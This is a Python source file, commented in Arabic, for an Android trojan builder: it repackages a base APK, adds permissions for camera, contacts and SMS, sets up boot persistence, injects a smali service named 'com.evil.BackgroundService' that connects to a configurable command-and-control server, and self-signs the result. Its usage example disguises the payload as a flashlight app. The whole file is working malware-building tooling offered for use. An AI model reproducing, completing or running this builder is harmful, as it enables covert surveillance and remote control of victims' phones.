#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
APK Builder Engine - محرك بناء التطبيقات (نسخة محسنة ومتكاملة)
يدمج بين الكود الأصلي والتحسينات الجديدة
"""

import os
import sys
import re
import shutil
import subprocess
import tempfile
import zipfile
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path

# استيراد المحمل الذكي
try:
    from smart_downloader import download_base_apk
except ImportError:
    print("⚠️ لم يتم العثور على smart_downloader.py، سيتم استخدام الطريقة التقليدية")
    def download_base_apk():
        return True  # نفترض أن الملف موجود

class APKBuilder:
    """
    محرك بناء APK متكامل
    - يدعم البناء من الصفر
    - يدعم حقن الكود في تطبيقات موجودة
    - يتأكد من وجود base.apk تلقائياً
    """
    
    def __init__(self):
        # المسارات الأساسية
        self.base_dir = Path(__file__).parent.parent
        self.template_dir = Path("builder_engine/templates/base_app")
        self.output_dir = Path("payloads")
        self.keystore_path = Path("builder_engine/keystore.jks")
        
        # إعدادات keystore
        self.keystore_password = "android123"
        self.key_alias = "androidkey"
        
        # إعدادات البناء
        self.app_name = "MyApp"
        self.package_name = "com.example.app"
        self.c2_server = "localhost"
        self.c2_port = 443
        self.permissions = ["INTERNET", "ACCESS_NETWORK_STATE"]
        self.persistence = True
        self.hide_icon = False
        
        # إنشاء المجلدات
        self.output_dir.mkdir(exist_ok=True)
        self.template_dir.mkdir(parents=True, exist_ok=True)
        
        # التأكد من وجود base.apk
        self._ensure_base_apk()
    
    def _ensure_base_apk(self):
        """التأكد من وجود base.apk صالح"""
        base_apk = self.template_dir / "base.apk"
        
        if base_apk.exists() and base_apk.stat().st_size > 100000:  # > 100KB
            print(f"✅ base.apk موجود: {base_apk.stat().st_size / 1024 / 1024:.2f} MB")
            return True
        
        print("📥 base.apk غير موجود أو غير صالح. جاري التحميل...")
        
        # محاولة التحميل باستخدام smart_downloader
        if download_base_apk():
            return True
        
        # إذا فشل، إنشاء واحد وهمي
        print("⚠️ إنشاء base.apk وهمي...")
        return self._create_dummy_base_apk()
    
    def _create_dummy_base_apk(self):
        """إنشاء base.apk وهمي للطوارئ"""
        base_apk = self.template_dir / "base.apk"
        
        with zipfile.ZipFile(base_apk, 'w', zipfile.ZIP_DEFLATED) as apk:
            manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.dummy"
    android:versionCode="1"
    android:versionName="1.0">
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:label="Dummy App">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>'''
            apk.writestr("AndroidManifest.xml", manifest.encode('utf-8'))
            
            # DEX header بسيط
            dex_header = bytes([
                0x64, 0x65, 0x78, 0x0A, 0x30, 0x33, 0x35, 0x00,
                0x00, 0x00, 0x00, 0x00,
            ] + [0x00] * 60)
            apk.writestr("classes.dex", dex_header)
            apk.writestr("resources.arsc", bytes([0x02, 0x00, 0x0C, 0x00] + [0x00] * 28))
        
        return True
    
    def build(self, config: dict = None) -> str:
        """
        بناء APK كامل
        
        config = {
            "app_name": "اسم التطبيق",
            "package_name": "com.example.app",
            "c2_server": "server.com",
            "c2_port": 443,
            "permissions": ["camera", "contacts", "sms"],
            "persistence": True,
            "hide_icon": False,
            "output_path": "output/app.apk"  # اختياري
        }
        """
        if config:
            self.app_name = config.get("app_name", self.app_name)
            self.package_name = config.get("package_name", self.package_name)
            self.c2_server = config.get("c2_server", self.c2_server)
            self.c2_port = config.get("c2_port", self.c2_port)
            self.permissions = config.get("permissions", self.permissions)
            self.persistence = config.get("persistence", self.persistence)
            self.hide_icon = config.get("hide_icon", self.hide_icon)
        
        print(f"""
╔══════════════════════════════════════════════════════════╗
║                 🔨 بدء بناء APK                           ║
╠══════════════════════════════════════════════════════════╣
║ 📛 الاسم: {self.app_name:<46} ║
║ 📦 الحزمة: {self.package_name:<44} ║
║ 🌐 C2: {self.c2_server}:{self.c2_port:<40} ║
║ 🔒 الصلاحيات: {', '.join(self.permissions)[:40]:<40} ║
╚══════════════════════════════════════════════════════════╝
        """)
        
        # 1. إنشاء مجلد عمل مؤقت
        temp_dir = Path(tempfile.mkdtemp(prefix="apk_build_"))
        print(f"📁 مجلد العمل: {temp_dir}")
        
        try:
            # 2. نسخ القالب
            base_apk = self.template_dir / "base.apk"
            work_apk = temp_dir / "app.apk"
            shutil.copy(base_apk, work_apk)
            
            # 3. فك ضغط الـ APK
            extract_dir = temp_dir / "extracted"
            extract_dir.mkdir()
            with zipfile.ZipFile(work_apk, 'r') as zf:
                zf.extractall(extract_dir)
            print("✅ تم فك ضغط APK")
            
            # 4. تعديل AndroidManifest.xml
            self._modify_manifest(extract_dir)
            print("✅ تم تعديل AndroidManifest.xml")
            
            # 5. حقن الكود الخبيث
            self._inject_payload(extract_dir)
            print("✅ تم حقن الكود")
            
            # 6. إعادة ضغط الـ APK
            unsigned_apk = temp_dir / "unsigned.apk"
            self._repack_apk(extract_dir, unsigned_apk)
            print("✅ تم إعادة ضغط APK")
            
            # 7. توقيع الـ APK
            output_filename = config.get("output_path") if config else None
            if not output_filename:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                output_filename = self.output_dir / f"{self.app_name.replace(' ', '_')}_{timestamp}.apk"
            else:
                output_filename = Path(output_filename)
            
            signed_apk = self._sign_apk(unsigned_apk, output_filename)
            print(f"✅ تم توقيع APK")
            
            # 8. تنظيف
            shutil.rmtree(temp_dir)
            
            print(f"""
╔══════════════════════════════════════════════════════════╗
║              ✅ تم بناء APK بنجاح!                         ║
╠══════════════════════════════════════════════════════════╣
║ 📍 المسار: {str(signed_apk)[:45]} ║
║ 📏 الحجم: {Path(signed_apk).stat().st_size / 1024 / 1024:.2f} MB{' ' * 38} ║
╚══════════════════════════════════════════════════════════╝
            """)
            
            return str(signed_apk)
            
        except Exception as e:
            print(f"❌ خطأ في بناء APK: {e}")
            if temp_dir.exists():
                shutil.rmtree(temp_dir)
            raise
    
    def _modify_manifest(self, extract_dir: Path):
        """تعديل AndroidManifest.xml"""
        manifest_path = extract_dir / "AndroidManifest.xml"
        
        # قراءة المحتوى الحالي
        if manifest_path.exists():
            with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
        else:
            content = ""
        
        # تحضير الصلاحيات
        permissions_xml = ""
        for perm in self.permissions:
            perm_upper = perm.upper()
            if not perm_upper.startswith("ANDROID.PERMISSION."):
                perm_upper = f"ANDROID.PERMISSION.{perm_upper}"
            permissions_xml += f'    <uses-permission android:name="{perm_upper}" />\n'
        
        # صلاحيات أساسية
        permissions_xml += '    <uses-permission android:name="android.permission.INTERNET" />\n'
        permissions_xml += '    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\n'
        
        if self.persistence:
            permissions_xml += '    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />\n'
            permissions_xml += '    <uses-permission android:name="android.permission.WAKE_LOCK" />\n'
        
        # استخراج اسم الحزمة من المحتوى الحالي أو استخدام الافتراضي
        package_match = re.search(r'package="([^"]+)"', content)
        if package_match:
            package_name = package_match.group(1)
        else:
            package_name = self.package_name
        
        # بناء service element
        service_element = ''
        if self.persistence:
            service_element = '''
        <service 
            android:name="com.evil.BackgroundService"
            android:enabled="true"
            android:exported="false" />
            
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
'''
        
        # إنشاء manifest جديد
        new_manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}"
    android:versionCode="1"
    android:versionName="1.0">

{permissions_xml}
    
    <application 
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="{self.app_name}"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        
        <activity 
            android:name=".MainActivity" 
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
{service_element}
    </application>
</manifest>'''
        
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(new_manifest)
    
    def _inject_payload(self, extract_dir: Path):
        """حقن الكود الخبيث"""
        # إنشاء مجلد smali
        smali_dir = extract_dir / "smali" / "com" / "evil"
        smali_dir.mkdir(parents=True, exist_ok=True)
        
        # نسخ BackgroundService.smali
        template_service = self.template_dir / "BackgroundService.smali"
        if template_service.exists():
            with open(template_service, 'r', encoding='utf-8') as f:
                service_content = f.read()
        else:
            service_content = self._generate_background_service()
        
        # استبدال عنوان C2
        service_content = service_content.replace("your-server.railway.app", self.c2_server)
        service_content = service_content.replace("const/16 v0, 0x1bb", f"const/16 v0, 0x{self.c2_port:x}")
        
        # حفظ الملف
        with open(smali_dir / "BackgroundService.smali", 'w', encoding='utf-8') as f:
            f.write(service_content)
        
        # إنشاء MainActivity إذا لم يكن موجوداً
        main_activity_dir = extract_dir / "smali" / "com" / "example" / "app"
        main_activity_dir.mkdir(parents=True, exist_ok=True)
        
        main_activity_path = main_activity_dir / "MainActivity.smali"
        if not main_activity_path.exists():
            main_activity_content = self._generate_main_activity()
            with open(main_activity_path, 'w', encoding='utf-8') as f:
                f.write(main_activity_content)
    
    def _generate_background_service(self) -> str:
        """توليد كود BackgroundService.smali"""
        return '''.class public Lcom/evil/BackgroundService;
.super Landroid/app/Service;

.field private deviceId:Ljava/lang/String;
.field private isRunning:Z
.field private thread:Ljava/lang/Thread;

.method public constructor <init>()V
    .locals 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    const/4 v0, 0x0
    iput-boolean v0, p0, Lcom/evil/BackgroundService;->isRunning:Z
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .locals 2
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    const-string v0, "BgService"
    const-string v1, "Service Started"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    invoke-direct {p0}, Lcom/evil/BackgroundService;->startC2Connection()V
    return-void
.end method

.method private startC2Connection()V
    .locals 2
    const/4 v0, 0x1
    iput-boolean v0, p0, Lcom/evil/BackgroundService;->isRunning:Z
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/evil/BackgroundService$1;
    invoke-direct {v1, p0}, Lcom/evil/BackgroundService$1;-><init>(Lcom/evil/BackgroundService;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    iput-object v0, p0, Lcom/evil/BackgroundService;->thread:Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    return-void
.end method
'''
    
    def _generate_main_activity(self) -> str:
        """توليد كود MainActivity.smali"""
        return '''.class public Lcom/example/app/MainActivity;
.super Landroid/app/Activity;

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    
    # بدء الخدمة الخبيثة
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/evil/BackgroundService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    return-void
.end method
'''
    
    def _repack_apk(self, extract_dir: Path, output_path: Path):
        """إعادة ضغط APK"""
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    file_path = Path(root) / file
                    arcname = str(file_path.relative_to(extract_dir))
                    zf.write(file_path, arcname)
    
    def _sign_apk(self, unsigned_path: Path, output_path: Path) -> str:
        """توقيع APK"""
        # إنشاء keystore إذا لم يكن موجوداً
        if not self.keystore_path.exists():
            self._create_keystore()
        
        # محاولة التوقيع
        try:
            cmd = [
                "jarsigner",
                "-verbose",
                "-sigalg", "SHA1withRSA",
                "-digestalg", "SHA1",
                "-keystore", str(self.keystore_path),
                "-storepass", self.keystore_password,
                "-keypass", self.keystore_password,
                str(unsigned_path),
                self.key_alias
            ]
            
            subprocess.run(cmd, check=True, capture_output=True, timeout=60)
            
            # نسخ الملف الموقع
            shutil.copy(unsigned_path, output_path)
            
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            print(f"⚠️ فشل التوقيع: {e}")
            print("📋 استخدام نسخة غير موقعة...")
            shutil.copy(unsigned_path, output_path)
        
        return str(output_path)
    
    def _create_keystore(self):
        """إنشاء keystore جديد"""
        print("🔑 إنشاء keystore جديد...")
        cmd = [
            "keytool",
            "-genkey",
            "-v",
            "-keystore", str(self.keystore_path),
            "-alias", self.key_alias,
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-storepass", self.keystore_password,
            "-keypass", self.keystore_password,
            "-dname", "CN=Android, OU=Android, O=Android, L=Android, ST=Android, C=US"
        ]
        
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=30)
            print("✅ تم إنشاء keystore")
        except Exception as e:
            print(f"⚠️ فشل إنشاء keystore: {e}")


# ==================== دوال مساعدة للاستخدام المباشر ====================

def build_apk(config: dict) -> str:
    """
    دالة مبسطة لبناء APK
    
    مثال:
        apk_path = build_apk({
            "app_name": "Flashlight Pro",
            "package_name": "com.flashlight.pro",
            "c2_server": "myserver.railway.app",
            "c2_port": 443
        })
    """
    builder = APKBuilder()
    return builder.build(config)


# ==================== اختبار ====================

if __name__ == "__main__":
    # اختبار المحرك
    builder = APKBuilder()
    
    apk_path = builder.build({
        "app_name": "TestApp",
        "package_name": "com.test.app",
        "c2_server": "localhost",
        "c2_port": 4444,
        "permissions": ["camera", "contacts"],
        "persistence": True
    })
    
    print(f"\n✅ APK جاهز: {apk_path}")